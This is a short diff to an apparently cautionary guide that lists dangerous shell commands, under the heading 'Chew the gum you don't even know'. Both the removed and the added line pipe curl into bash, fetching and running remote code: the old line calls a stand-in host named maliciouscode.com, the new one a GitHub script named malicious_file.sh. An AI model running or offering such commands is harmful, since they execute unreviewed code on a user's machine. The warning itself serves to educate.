@@ -51,7 +51,7 @@ F. Chew the gum you don't even know: \
 This downloads code online and runs it without ever you reviewing or seeing it
 
 ``` bash
-bash -c "$(curl http://maliciouscode.com/rm) &"
+bash -c "$(curl -s https://raw.githubusercontent.com/thedzy/My-one-page-argument-for-learning-to-code/master/malicious_file.sh)"
 ```
 
 G. Frees up uneccesary space: \
